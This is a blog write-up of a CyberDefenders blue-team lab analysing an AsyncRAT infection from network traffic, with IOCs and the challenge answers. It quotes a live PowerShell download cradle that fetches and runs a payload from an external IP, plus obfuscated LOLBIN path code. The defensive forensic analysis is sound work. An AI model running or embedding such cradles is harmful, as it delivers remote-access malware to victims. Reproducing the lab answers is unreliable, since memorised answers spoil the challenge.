---
layout: lab
title: XLMRat
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
tools: "[CyberChef, Wireshark, VirusTotal, Python3, PowerShell]"
tactics: "[Execution, Defense Evasion]"
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/xlmrat/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/
permalink: /blue-team/labs/CHANGE-ME/
summary: '"Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading."'
art: https://cyberdefenders.org/media/terraform/XLMRat/terraform/XLMRat/xlmrat.webp
---
## Scenario

A compromised machine was flagged due to suspicious network traffic. A PCAP was provided to determine the attack method, identify malicious payloads, and trace the timeline of events from initial access through post-compromise activity.

---

## Tooling

- Wireshark
- CyberChef
- VirusTotal

---

## Investigation

### Stage 1 — Obfuscated Download Cradle

Analysis of the PCAP revealed the victim machine retrieving `xlm.txt` — an obfuscated XLM macro script designed to hide its payload URL from static detection. Deobfuscating the script revealed a PowerShell download cradle:

`IeX(NeW-OBJeCT Net.WeBCLIeNT).DOWNLOADSTRING('http://45.126.209.4:222/mdm.jpg')`

The payload was hosted at `45.126.209.4` on port 222, owned by hosting provider **ReliableSite.Net** — a bulletproof hosting provider commonly abused for C2 infrastructure.

The `.jpg` extension is purely evasion — the file is not an image.

---
### Stage 2 — Payload Analysis

The downloaded `mdm.jpg` was analysed in CyberChef. Despite the extension, the file header revealed an `MZ` magic byte (`4D 5A`) — confirming a Windows PE executable disguised as a JPEG.

The hex-encoded content was reconstructed using CyberChef:

1. **Find/Replace** — strip `_` delimiters from the hex string
2. **From Hex** — convert to binary
3. Save output as `.exe`
![[xlmrat_cyberchef.png]]
**SHA256:** `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`

VirusTotal identified the malware family as **AsyncRAT** via Alibaba's engine, with a PE compilation timestamp of **2023-10-30 15:08:44 UTC**.
![[xlmrat_vt.png]]

---
### Stage 3 — LOLBIN Abuse

The malicious script leveraged a signed Microsoft binary to execute the payload stealthily, bypassing application whitelisting controls. The path was obfuscated using `#` character injection with a string replace:

```
$NA = 'C:\W#######indow############s\Mi####cr'-replace '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace '#', ''
```

Resolved path: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`

**RegSvcs.exe** is a signed .NET component abused as a LOLBIN to load and execute malicious .NET assemblies without triggering application whitelisting. This maps to MITRE T1218 — Signed Binary Proxy Execution.

![[xlmrat_lolbas.png]]

---

### Stage 4 — Dropped Files

The payload dropped three persistence-related files to disk:

- `Conted.bat`
- `Conted.ps1`
- `Conted.vbs`

The use of multiple file types (.bat, .ps1, .vbs) suggests a layered persistence mechanism designed to survive partial cleanup attempts.
## IOCs 

| Type             | Value                                                            |
| ---------------- | ---------------------------------------------------------------- |
| URL              | hxxp[://]45[.]126[.]209[.]4:222/mdm[.]jpg                        |
| IP               | 45[.]126[.]209[.]4                                               |
| Hosting Provider | ReliableSite[.]Net                                               |
| SHA256           | 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798 |
| Malware Family   | AsyncRAT                                                         |
| Compilation Time | 2023-10-30 15:08:44 UTC                                          |
| LOLBIN           | C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe        |
| Dropped Files    | Conted.bat, Conted.ps1, Conted.vbs                               |
|                  |                                                                  |


{% include flag.html question="The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?" answer="http://45.126.209.4:222/mdm.jpg" %}

{% include answer.html question="Which hosting provider owns the associated IP address?" answer="" %}

{% include flag.html question="By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?" answer="1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798" %}

{% include answer.html question="What is the malware family label based on Alibaba?" answer="asyncrat" %}

{% include flag.html question="What is the timestamp of the malware's creation?" answer="2023-10-30 15:08" %}

{% include answer.html question="Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path." answer="C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe" %}

{% include flag.html question="The script is designed to drop several files. List the names of the files dropped by the script." answer="Conted.bat,Conted.ps1,Conted.vbs" %}

I successfully completed XLMRat Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/xlmrat/
 
#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender